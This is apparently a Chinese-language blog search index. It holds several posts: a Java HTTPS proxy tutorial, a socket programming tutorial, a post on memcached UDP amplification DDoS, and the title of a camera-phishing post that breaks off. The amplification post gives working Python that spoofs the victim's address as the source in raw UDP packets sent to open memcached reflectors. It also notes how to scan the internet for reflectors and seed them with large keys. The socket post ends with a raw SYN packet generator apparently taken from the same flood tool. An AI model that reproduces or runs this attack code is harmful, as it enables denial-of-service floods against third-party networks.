<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java实现http https proxy</title>
    <link href="/2022/04/26/Java%E5%AE%9E%E7%8E%B0http-https-proxy/"/>
    <url>/2022/04/26/Java%E5%AE%9E%E7%8E%B0http-https-proxy/</url>
    
    <content type="html"><![CDATA[<h1 id="http和https代理实现的区别"><a href="#http和https代理实现的区别" class="headerlink" title="http和https代理实现的区别"></a>http和https代理实现的区别</h1><p>由于https在传输时会经过浏览器加密，那么如何知道你要请求的host以及port？</p><p>不同于http，https会在请求之前发送CONNECT头，具体形式为<code>CONNECT (.+):(.+) HTTP/(1\.[01])</code>，这个请求会告知网关要访问的地址(NAT)，网关解析到地址之后，会返回浏览器信息如下：</p><figure class="highlight http"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs http">HTTP/1.[01] 200 Connection established\r\n<br><span class="hljs-attribute">Proxy-agent</span><span class="hljs-punctuation">: </span>Simple/0.1\r\n\r\n<br></code></pre></td></tr></table></figure><p>当浏览器收到回复后，会发送加密后的请求头等信息</p><h1 id="实现https-proxy"><a href="#实现https-proxy" class="headerlink" title="实现https proxy"></a>实现https proxy</h1><h2 id="客户端启动器"><a href="#客户端启动器" class="headerlink" title="客户端启动器"></a>客户端启动器</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpClient</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpClient</span>()).run();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpClient</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>(<span class="hljs-string">&quot;Server Thread&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ServerSocket</span> <span class="hljs-variable">serverSocket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerSocket</span>(<span class="hljs-number">25800</span>)) &#123;<br>            Socket socket;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> ((socket = serverSocket.accept()) != <span class="hljs-literal">null</span>) &#123;<br>                    (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handler</span>(socket)).start();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> implement catch</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();  <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> implement catch</span><br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="请求Handler"><a href="#请求Handler" class="headerlink" title="请求Handler"></a>请求Handler</h2><h3 id="一行一行读取数据"><a href="#一行一行读取数据" class="headerlink" title="一行一行读取数据"></a>一行一行读取数据</h3><div class="code-wrapper"><pre><code class="java">private String readLine(Socket socket) throws IOException &#123;            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();            int next;            readerLoop:</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>proxy</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDOS-TYPE[MEM-AMP]</title>
    <link href="/2022/04/09/DDOS-TYPE-MEM-AMP/"/>
    <url>/2022/04/09/DDOS-TYPE-MEM-AMP/</url>
    
    <content type="html"><![CDATA[<h3 id="Memcrashed-来自-UDP-端口-11211-的主要放大攻击"><a href="#Memcrashed-来自-UDP-端口-11211-的主要放大攻击" class="headerlink" title="Memcrashed - 来自 UDP 端口 11211 的主要放大攻击"></a>Memcrashed - 来自 UDP 端口 11211 的主要放大攻击</h3><p>Memcache支持udp， udp是con-less的，得知 memcached 支持 UDP 时，我感到很惊讶！协议规范表明它是有史以来用于放大的最佳协议之一！绝对零检查，数据将以惊人的速度交付给客户！此外，请求可能很小，响应可能很大（高达 1MB）。</p><p>所有放大攻击背后的总体思路都是相同的。具有 IP 欺骗能力的攻击者向易受攻击的 UDP 服务器发送伪造的请求。 UDP 服务器不知道请求是伪造的，礼貌地准备响应。当数以千计的响应被传递到毫无戒心的目标主机时，就会出现问题，导致其资源不堪重负——最常见的是网络本身。</p><h3 id="对于开发者如何抵制放大攻击"><a href="#对于开发者如何抵制放大攻击" class="headerlink" title="对于开发者如何抵制放大攻击"></a>对于开发者如何抵制放大攻击</h3><p>开发者 拜托拜托：停止使用UDP。如果必须，请不要默认启用它。如果您不知道什么是放大攻击，永远不要在编辑器中输入 <code>SOCK_DGRAM</code>。</p><p>CloudFlare:<br>  我们已经走这条路很多次了。 DNS、NTP、Chargen、SSDP 和现在的 memcached。如果您使用 UDP，则必须始终使用比请求更小的数据包大小来响应。否则你的协议将被滥用。还要记住，人们确实忘记设置防火墙。做个好公民。不要发明缺少任何类型身份验证的基于 UDP 的协议。</p><h3 id="MEM放大攻击"><a href="#MEM放大攻击" class="headerlink" title="MEM放大攻击"></a>MEM放大攻击</h3><p>需要的包</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> memcache<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> cycle<br><span class="hljs-keyword">from</span> impacket.ImpactPacket <span class="hljs-keyword">import</span> IP, TCP, UDP, Data<br></code></pre></td></tr></table></figure><p>主方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">AMP</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">global</span> bytes_sent, REQUESTS_SENT<br>    payload = <span class="hljs-built_in">next</span>(self._amp_payloads)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> socket(AF_INET, SOCK_RAW,<br>                    IPPROTO_UDP) <span class="hljs-keyword">as</span> s:<br>            s.setsockopt(IPPROTO_IP, IP_HDRINCL, <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">while</span> s.sendto(*payload):<br>                REQUESTS_SENT += <span class="hljs-number">1</span><br>                bytes_sent += <span class="hljs-built_in">len</span>(payload[<span class="hljs-number">0</span>])<br><br>    <span class="hljs-keyword">except</span> Exception:<br>        s.close()<br></code></pre></td></tr></table></figure><p>_amp_payloads构造 ，攻击网站</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_amp</span>(<span class="hljs-params">self</span>):<br>    payloads = []<br>    <span class="hljs-keyword">for</span> ref <span class="hljs-keyword">in</span> self._ref:<br>        ip: IP = IP()<br>        ip.set_ip_src(self._target[<span class="hljs-number">0</span>]) <span class="hljs-comment"># 被攻击地址 需要开启udp </span><br>        ip.set_ip_dst(ref) <span class="hljs-comment"># ref为全网的开启udp memcache服务器地址</span><br><br>        ud: UDP = UDP()<br>        ud.set_uh_dport(self._amp_payload[<span class="hljs-number">1</span>]) <span class="hljs-comment"># 11211 memcache 端口</span><br>        ud.set_uh_sport(self._target[<span class="hljs-number">1</span>]) <span class="hljs-comment"># 设置udp请求端口来源为被攻击端口</span><br><br>        ud.contains(Data(self._amp_payload[<span class="hljs-number">0</span>])) <span class="hljs-comment"># gets p s h</span><br> <span class="hljs-comment"># 这些key可以  通过seed注入到memcache</span><br> <span class="hljs-comment"># 大致来说  使用zmap扫描所有ip 开启了11211udp的服务器，并植入key</span><br>        ip.contains(ud)<br><br>        payloads.append((ip.get_packet(), (ref, self._amp_payload[<span class="hljs-number">1</span>])))<br>    <span class="hljs-keyword">return</span> payloads<br></code></pre></td></tr></table></figure><p><code>[1]https://github.com/Phenomite/AMP-Research</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>DDOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SOCKET Communication</title>
    <link href="/2022/04/08/SOCKET-Communication/"/>
    <url>/2022/04/08/SOCKET-Communication/</url>
    
    <content type="html"><![CDATA[<h3 id="基于TCP协议的Socket调用过程"><a href="#基于TCP协议的Socket调用过程" class="headerlink" title="基于TCP协议的Socket调用过程"></a>基于TCP协议的Socket调用过程</h3><p><img src="https://cdn.jsdelivr.net/gh/Sobev/image-hosting@master/20220407/socket-tcp.png"></p><p>测试代码<br>服务端</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *  把从客户端读取到的一行数据的字符进行翻转，然后发送给客户端</span><br><span class="hljs-comment"> *  当读取到over时，连接断开</span><br><span class="hljs-comment"> */</span><br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TcpService</span><br>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>&#123;<br> <br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">ServerSocket</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerSocket</span>(<span class="hljs-number">10002</span>);<br> <br><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br><span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> server.accept();<br><span class="hljs-type">MyThread</span> <span class="hljs-variable">myThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyThread</span>(socket);<br>myThread.start();<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span><br>&#123;<br><span class="hljs-keyword">private</span> Socket socket;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-title function_">MyThread</span><span class="hljs-params">(Socket socket)</span><br>&#123;<br><span class="hljs-built_in">this</span>.socket = socket;<br>&#125;<br> <br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(socket.getInputStream()));<br><span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bufferedWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(socket.getOutputStream()));<br><span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;over&quot;</span>.equalsIgnoreCase(line)) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br> <br><span class="hljs-comment">// 字符翻转的操作</span><br><span class="hljs-type">char</span>[] chs = line.toCharArray();<br> <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; chs.length / <span class="hljs-number">2</span>; i++) &#123;<br><span class="hljs-type">char</span> <span class="hljs-variable">ch</span> <span class="hljs-operator">=</span> chs[i];<br>chs[i] = chs[chs.length - <span class="hljs-number">1</span> - i];<br>chs[chs.length - <span class="hljs-number">1</span> - i] = ch;<br>&#125;<br> <br>bufferedWriter.write(chs);<br>bufferedWriter.newLine();<br>bufferedWriter.flush();<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>socket.close();<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br> <br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TcpClient</span><br>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>&#123;<br><span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>socket = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">10002</span>);<br><span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(socket.getInputStream()));<br><span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">bufferedWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(socket.getOutputStream()));<br> <br>scanner = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">while</span> ((line = scanner.nextLine()) != <span class="hljs-literal">null</span>) &#123;<br>bufferedWriter.write(line);<br>bufferedWriter.newLine();<br>bufferedWriter.flush();<br>line = bufferedReader.readLine();<br><span class="hljs-keyword">if</span> (line == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>System.out.println(line);<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">if</span> (socket != <span class="hljs-literal">null</span>) &#123;<br>socket.close();<br>&#125;<br>&#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>e.printStackTrace();<br>&#125;<br><span class="hljs-keyword">if</span> (scanner != <span class="hljs-literal">null</span>) &#123;<br>scanner.close();<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="基于UDP协议的Socket调用过程"><a href="#基于UDP协议的Socket调用过程" class="headerlink" title="基于UDP协议的Socket调用过程"></a>基于UDP协议的Socket调用过程</h3><p>对于 UDP 来讲，过程有些不一样。UDP 是没有连接的，所以不需要三次握手，也就不需要调用 listen 和 connect，但是，UDP 的的交互仍然需要 IP 和端口号，因而也需要 bind。UDP 是没有维护连接状态的，因而不需要每对连接建立一组 Socket，而是只要有一个 Socket，就能够和多个客户端通信。也正是因为没有连接状态，每次通信的时候，都调用 sendto 和 recvfrom，都可以传入 IP 地址和端口。</p><p><img src="https://cdn.jsdelivr.net/gh/Sobev/image-hosting@master/20220407/socket-udp.png"></p><p>DatagramSocket 表示通信的一端，可以发送、接收数据包</p><p>DatagramPacket 数据包，理论上一个数据包可包含的数据量最多为65535字节</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UDPSend</span><br>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException<br>&#123;<br><span class="hljs-type">DatagramSocket</span> <span class="hljs-variable">sendSocket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramSocket</span>(<span class="hljs-number">10003</span>);<br><span class="hljs-type">byte</span>[] data = <span class="hljs-string">&quot;hello&quot;</span>.getBytes();<br><span class="hljs-type">DatagramPacket</span> <span class="hljs-variable">packet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramPacket</span>(data, data.length, InetAddress.getLocalHost(), <span class="hljs-number">10004</span>);<br>sendSocket.send(packet);<br>sendSocket.close();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UDPReceive</span><br>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException<br>&#123;<br><span class="hljs-type">DatagramSocket</span> <span class="hljs-variable">receiveSocket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramSocket</span>(<span class="hljs-number">10004</span>);<br><span class="hljs-type">byte</span>[] buff = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br><span class="hljs-type">DatagramPacket</span> <span class="hljs-variable">packet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DatagramPacket</span>(buff, buff.length);<br>receiveSocket.receive(packet);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> packet.getLength();<br>System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(buff, <span class="hljs-number">0</span>, len));<br>receiveSocket.close();<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Socket底层参数"><a href="#Socket底层参数" class="headerlink" title="Socket底层参数"></a>Socket底层参数</h3><p><code>#include sockfd = socket(int socket_family, int socket_type, int protocol);</code></p><p>/* 创建TCP socket*/</p><p>sockfd = socket(AF_INET, SOCK_STREAM, 0);</p><p>/* 创建UDP socket*/</p><p>sockfd = socket(AF_INET, SOCK_DGRAM, 0);</p><p>为何用AF_INET, SOCK_STREAM或SOCK_DGRAM, 第三个参数为何为0</p><h4 id="第一个参数"><a href="#第一个参数" class="headerlink" title="第一个参数"></a>第一个参数</h4><p>  第一个参数表示创建的socket所属的地址簇或者协议簇，取值以AF或者PF开头定义在(includelinuxsocket.h)，实际使用中并没有区别(有两个不同的名字只是因为是历史上的设计原因)。最常用的取值有AF_INET,AF_PACKET,AF_UNIX等。AF_UNIX用于主机内部进程间通信，本文暂且不谈。AF_INET与AF_PACKET的区别在于使用前者只能看到IP层以上的东西，而后者可以看到链路层的信息。</p><p>网络报文的分类。如下图所示：Ethernet II帧是应用最为广泛的帧类型(当然也有像PPP这样的其他链路帧类型)。Ethernet II帧内部，又可大致分为IP报文和其他报文。我们熟悉的TCP或者UDP报文都属于IP报文。</p><p><img src="https://cdn.jsdelivr.net/gh/Sobev/image-hosting@master/20220407/d6eb2c35684d602dd9897191c43160de.jpg"></p><p>AF_INET是与IP报文对应的，而AF_PACKET则是与Ethernet II报文对应的。AF_INET创建的套接字称为inet socket，而AF_PACKET创建的套接字称为packet socket</p><p><img src="https://cdn.jsdelivr.net/gh/Sobev/image-hosting@master/20220407/9f88eb01f8897777c9cde27acbc8bfbc.jpg"></p><h4 id="第二个参数"><a href="#第二个参数" class="headerlink" title="第二个参数"></a>第二个参数</h4><p>第一个参数family会影响第二个参数socket_type和第三个参数protocol取值范围<br>第二个参数socket_type表示套接字类型。它的取值不多，常见的就以下三种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">sock_type</span> &#123;</span><br><br>SOCK_STREAM = <span class="hljs-number">1</span>, <span class="hljs-comment">/* stream (connection) socket */</span><br><br>SOCK_DGRAM = <span class="hljs-number">2</span>, <span class="hljs-comment">/* datagram (conn.less) socket */</span><br><br>SOCK_RAW = <span class="hljs-number">3</span>, <span class="hljs-comment">/* raw socket */</span><br><br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="第三个参数protocol表示套接字上报文的协议"><a href="#第三个参数protocol表示套接字上报文的协议" class="headerlink" title="第三个参数protocol表示套接字上报文的协议"></a>第三个参数protocol表示套接字上报文的协议</h4><p>对于AF_INET地址簇，protocol的取值范围是如 IPPROTO_TCP IPPROTO_UDP IPPROTO_ICMP 这样的IP报文协议类型，或者IPPROTO_IP = 0 这个特殊值</p><p>对于AF_PACKET地址簇，protocol的取值范围是 ETH_P_IP ETH_P_ARP这样的以太帧协议类型。</p><p>限制<br>每一个inet socket只能收发一种IP协议类型的报文，这是在套接字创建的时候就决定的(protocol参数)，比如TCP套接字是不能收发UDP报文的，反之也是一样。并且，protocol的值还受到socket_type的限制，不匹配的取值会导致套接字创建操作会返回失败。</p><p>/* 错误取值，返回失败 */</p><p><code>sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_TCP);</code></p><p><img src="https://cdn.jsdelivr.net/gh/Sobev/image-hosting@master/20220407/6083c0c50c5a9107d8bdbd81f47398c1.jpg"></p><p>第三个参数为0时：<br>  IPPROTO_IP的值为0, 在用户使用0作为创建套接字的第三个参数时，会匹配到该链表上的第一个协议，这正是创建TCP或者UDP套接字时，第三个参数可以为0的原因, 0表示由内核自动选择</p><h4 id="对于Inet-Socket-TCP报文分解"><a href="#对于Inet-Socket-TCP报文分解" class="headerlink" title="对于Inet Socket  TCP报文分解"></a>对于Inet Socket  TCP报文分解</h4><p><code>packet = IP Header + TCP Header + Payload</code></p><p>使用SOCK_STREAM时，只需提供Payload，其他的由内核组装而成</p><p>使用SOCK_RAW，为应用提供更底层的控制力<br><code>int s = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);</code><br>更为原始的TCP套接字，发送数据时 需要提供Payload和TCP Header，而IP Header依然由内核协议栈自动组装。</p><p>使用IPPROTO_RAW, 手动组装全部<br><code>int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);</code><br>或者<br><code>s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)</code></p><p>自行创建ip和tcp首部</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_genrate_syn</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    ip: IP = IP()<br>    ip.set_ip_src(getMyIPAddress())<br>    ip.set_ip_dst(self._target[<span class="hljs-number">0</span>])<br>    tcp: TCP = TCP()<br>    tcp.set_SYN()<br>    tcp.set_th_dport(self._target[<span class="hljs-number">1</span>])<br>    tcp.set_th_sport(randint(<span class="hljs-number">1</span>, <span class="hljs-number">65535</span>))<br>    ip.contains(tcp)<br>    <span class="hljs-keyword">return</span> ip.get_packet()<br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_39934302/article/details/116863049"> ref </a></p>]]></content>
    
    
    
    <tags>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CamPhish钓鱼-Illegal</title>
    <link href="/2022/04/04/CamPhish%E9%92%93%E9%B1%BC-Illegal/"/>
    <url>/2022/04/04/CamPhish%E9%92%93%E9%B1%BC-Illegal/</url>
    
